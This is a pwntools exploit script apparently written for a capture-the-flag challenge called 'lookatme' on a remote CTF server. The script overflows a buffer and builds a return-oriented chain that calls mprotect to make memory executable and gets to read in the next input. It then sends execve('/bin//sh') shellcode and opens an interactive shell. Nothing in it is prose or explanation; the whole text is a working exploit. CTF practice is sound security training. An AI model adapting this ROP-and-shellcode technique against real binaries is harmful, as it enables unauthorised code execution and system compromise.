from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3017)
#p = process('./lookatme')
pause()

context.log_level = "debug"

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
mprotect = 0x806e0f0
ppp_r = 0x0809d33b
gets = 0x804f120

payload = 'a' * 0x18 + 'b' * 4

payload += p32(mprotect)
payload += p32(ppp_r)
payload += p32(0x80eb000)
payload += p32(10000)
payload += p32(7)

payload += p32(gets)
payload +=p32(0x80ebda1)
payload += p32(0x80ebda1)

p.sendline(payload)

p.sendline(shellcode)

p.interactive()
